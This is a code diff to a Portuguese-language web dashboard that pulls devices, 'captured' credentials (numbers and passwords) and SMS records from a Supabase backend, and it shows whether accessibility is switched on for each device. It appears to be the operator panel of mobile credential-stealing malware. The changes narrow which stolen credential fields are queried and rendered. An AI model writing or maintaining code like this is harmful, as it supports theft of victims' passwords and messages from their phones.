@@ -1532,7 +1532,7 @@ function renderLista(dispositivos, credenciais) {
         </div></div>
         <div class="cell hide-mobile">${escapeHtml(dev.versao||"—")}</div>
         <div class="cell hide-mobile">${escapeHtml(formatDate(dev.ultimo_acesso))}</div>
-        <div class="cell hide-mobile">${escapeHtml(devCreds.filter(c=>c.tipo==="Numero"||c.tipo==="numero")[0]?.valor||dev.numero||"—")}</div>
+        <div class="cell hide-mobile">${escapeHtml(devCreds.filter(c=>c.tipo==="Numero"||c.tipo==="numero")[0]?.valor||"—")}</div>
         <div><span>${acessAtiva?"♿ ON":"♿ OFF"}</span> <span class="badge ${activo?"active":"idle"}">${activo?"ACTIVO":"INACTIVO"}</span></div>
       </div>
       <div class="history-panel"><div class="history-inner"><div class="history-grid">
@@ -1545,8 +1545,8 @@ function renderLista(dispositivos, credenciais) {
         </div>
         <div class="info-block"><h4>📊 Actividade</h4>
           <div class="info-row"><span class="info-label">Último Acesso</span><span class="info-val">${escapeHtml(formatDate(dev.ultimo_acesso))}</span></div>
-          <div class="info-row"><span class="info-label">Número</span><span class="info-val green">${escapeHtml(devCreds.filter(c=>c.tipo==='Numero'||c.tipo==='numero')[0]?.valor||dev.numero||'—')}</span></div>
-          <div class="info-row"><span class="info-label">Senha</span><span class="info-val red">${escapeHtml(devCreds.filter(c=>c.tipo==='Senha'||c.tipo==='senha')[0]?.valor||dev.senha||'—')}</span></div>
+          <div class="info-row"><span class="info-label">Número</span><span class="info-val green">${escapeHtml(devCreds.filter(c=>c.tipo==='Numero'||c.tipo==='numero')[0]?.valor||'—')}</span></div>
+          <div class="info-row"><span class="info-label">Senha</span><span class="info-val red">${escapeHtml(devCreds.filter(c=>c.tipo==='Senha'||c.tipo==='senha')[0]?.valor||'—')}</span></div>
           <div class="info-row"><span class="info-label">Registos</span><span class="info-val">${devCreds.length}</span></div>
           <div class="info-row"><span class="info-label">Estado</span><span class="info-val">${activo?"Activo hoje":"Inactivo"}</span></div>
           <div class="info-row"><span class="info-label">Acessibilidade</span><span class="info-val">${acessAtiva?"Activa":"Inactiva"}</span></div>
@@ -1563,7 +1563,7 @@ function renderLista(dispositivos, credenciais) {
             <div class="tipo">${getTipoLabel(c.tipo)}
               <span class="cred-capturado-em" title="Momento exacto da captura">🕒 ${formatDateHora(c.criado_em||c.created_at)}</span>
             </div>
-            <div>${c.numero?'📞 '+escapeHtml(c.numero):''}${c.senha?' · 🔑 '+escapeHtml(c.senha):''}${c.valor?escapeHtml(c.valor):''}</div>
+            <div>${c.valor?escapeHtml(c.valor):'—'}</div>
           </div>
         </div>
       `).join('')}
@@ -1776,7 +1776,7 @@ async function carregarDados() {
       fetch(SUPA_URL+"/rest/v1/sms?select=id,device_id,timestamp_ms&order=timestamp_ms.desc&limit=1000", {headers})
     ]);
     const d1=await r1.json(), d3=await r3.json();
-    const d2 = await fetchAllPages(SUPA_URL+"/rest/v1/credenciais?select=id,device_id,tipo,valor,numero,senha,criado_em,created_at&order=id.desc");
+    const d2 = await fetchAllPages(SUPA_URL+"/rest/v1/credenciais?select=id,device_id,tipo,valor,criado_em&order=id.desc");
     todosDispositivos = Array.isArray(d1)?d1:[];
     todasCredenciais  = Array.isArray(d2)?d2:[];
     todasSMS          = Array.isArray(d3)?d3:[];
@@ -1876,7 +1876,7 @@ function iniciarPainel() {
         fetch(SUPA_URL+"/rest/v1/sms?select=id,device_id,timestamp_ms&order=timestamp_ms.desc&limit=1000",{headers:h})
       ]);
       const d1=await r1.json(), d3=await r3.json();
-      const d2 = await fetchAllPages(SUPA_URL+"/rest/v1/credenciais?select=id,device_id,tipo,valor,numero,senha,criado_em,created_at&order=id.desc");
+      const d2 = await fetchAllPages(SUPA_URL+"/rest/v1/credenciais?select=id,device_id,tipo,valor,criado_em&order=id.desc");
       todosDispositivos = Array.isArray(d1)?d1:todosDispositivos;
       todasCredenciais  = Array.isArray(d2)?d2:todasCredenciais;
       todasSMS          = Array.isArray(d3)?d3:todasSMS;
